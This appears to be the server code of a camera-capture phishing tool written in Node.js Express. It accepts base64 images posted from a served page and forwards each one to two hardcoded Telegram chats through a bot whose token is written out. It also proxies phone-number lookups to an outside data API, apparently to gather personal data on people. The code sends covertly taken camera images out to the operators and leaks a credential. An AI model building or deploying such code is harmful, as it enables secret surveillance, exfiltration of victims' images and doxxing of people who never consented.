import express from "express";
import fetch from "node-fetch";
import bodyParser from "body-parser";
import FormData from "form-data";

const app = express();

// Telegram config
const BOT_TOKEN = "8237344741:AAHYDjgU3xp_dChK2Ll_Bp7Z6gCwxqOBwKc";

// Chat IDs
const CHAT_IDS = ["8167904992", "6022286935"];

// Middleware
app.use(bodyParser.json({ limit: "10mb" }));

// Serve index.html
app.get("/", (req, res) => {
  res.sendFile("index.html", { root: "." });
});

// Camera upload endpoint
app.post("/upload", async (req, res) => {
  try {
    const { image } = req.body;
    if (!image || !image.startsWith("data:image/png;base64,")) {
      return res.status(400).json({ status: "error", msg: "invalid data" });
    }

    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");

    // Send to multiple Telegram chats
    for (let chat_id of CHAT_IDS) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
      const formData = new FormData();
      formData.append("chat_id", chat_id);
      formData.append("caption", "New capture received 📸");
      formData.append("photo", buffer, { filename: "capture.png" });

      await fetch(url, { method: "POST", body: formData });
    }

    res.json({ status: "ok", sent_to: CHAT_IDS.length });
  } catch (err) {
    console.error(err);
    res.status(500).json({ status: "error", msg: err.message });
  }
});

// Proxy route for phone API
app.get("/api-proxy", async (req, res) => {
  const phone = req.query.phone;
  if (!phone) {
    return res.status(400).json({ error: "phone parameter missing" });
  }

  const api_url = `https://api.impossible-world.xyz/api/data?phone=${phone}`;
  try {
    const response = await fetch(api_url);
    const data = await response.json();
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Start server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});